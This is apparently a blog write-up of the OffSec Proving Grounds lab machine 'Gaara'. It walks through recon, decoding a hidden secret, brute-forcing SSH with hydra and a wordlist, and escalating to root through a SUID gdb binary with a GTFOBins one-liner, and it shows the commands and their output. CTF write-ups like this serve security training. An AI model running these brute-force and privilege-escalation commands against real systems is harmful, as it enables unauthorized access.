---
title: "Proving grounds Play: Gaara"
layout: post
date: 2023-09-29 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- Pg-Play
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---

## Nmap

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 3ea36f6403331e76f8e498febee98e58 (RSA)
|   256 6c0eb500e742444865effed77ce664d5 (ECDSA)
|_  256 b751f2f9855766a865542e05f940d2f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Gaara
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 80/tcp - open  http - Apache httpd 2.4.38 ((Debian))

![img](/assets/images/CTF/Proving_Grounds/Gaara/web.png)

### Directory Fuzzing

```text
http://192.168.198.142/Cryoserver

/Temari
/Kazekage
/iamGaara
```

The directory `/iamGaara` has a base58 encoded secret in one of the paragraph.

![img](/assets/images/CTF/Proving_Grounds/Gaara/secret.png)

### Decoding secret

![img](/assets/images/CTF/Proving_Grounds/Gaara/decode.png)

**SSH Credentials**: `gaara:ismyname`

Unfortunately the password didn't worked, so perform brtue forcing the password using hydra.

## SSH Brute Forcing

```sh
naveenj@hackerspace:|21:26|~/pg-play/Gaara$ hydra -l gaara -P /usr/share/wordlists/rockyou.txt -t 40 ssh://192.168.198.142
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-28 21:26:39
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 40 tasks per 1 server, overall 40 tasks, 14344399 login tries (l:1/p:14344399), ~358610 tries per task
[DATA] attacking ssh://192.168.198.142:22/
[22][ssh] host: 192.168.198.142   login: gaara   password: iloveyou2 #password
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 18 final worker threads did not complete until end.
[ERROR] 18 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-28 21:27:41
```

SSH to the user gaara using the cracked password to obtain initial foothold.

## Privilege Escalation

Enumerate SUID binaries, incase if the SUID binaries enumerated are not clear if it's vulnerable or not use the below codes to automate.

- [GitHub - Anon-Exploiter/SUID3NUM](https://github.com/Anon-Exploiter/SUID3NUM)
- [GitHub - etc5had0w/suider/blob/main/suider.sh](https://github.com/etc5had0w/suider/blob/main/suider.sh)

### SUIDs

```sh
gaara@Gaara:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/gdb    #vulnerable
/usr/bin/sudo
/usr/bin/gimp-2.10
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/umount
```

The SUID binary `gdb` is vulnerable for exploitation, search for exploit on GTFO bins.

### GTFO Bins Exploit

If the binary has the SUID bit set, it does not drop the elevated  privileges and may be abused to access the file system, escalate or  maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.
This example creates a local SUID copy of the binary and runs it to  maintain elevated privileges. To interact with an existing SUID binary  skip the first command and run the program using its original path. This requires that GDB is compiled with Python support.

```sh
sudo install -m =xs $(which gdb) .
./gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
```

**Root Obtained**

```sh
gaara@Gaara:/tmp$ /usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
# whoami
root
```


Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).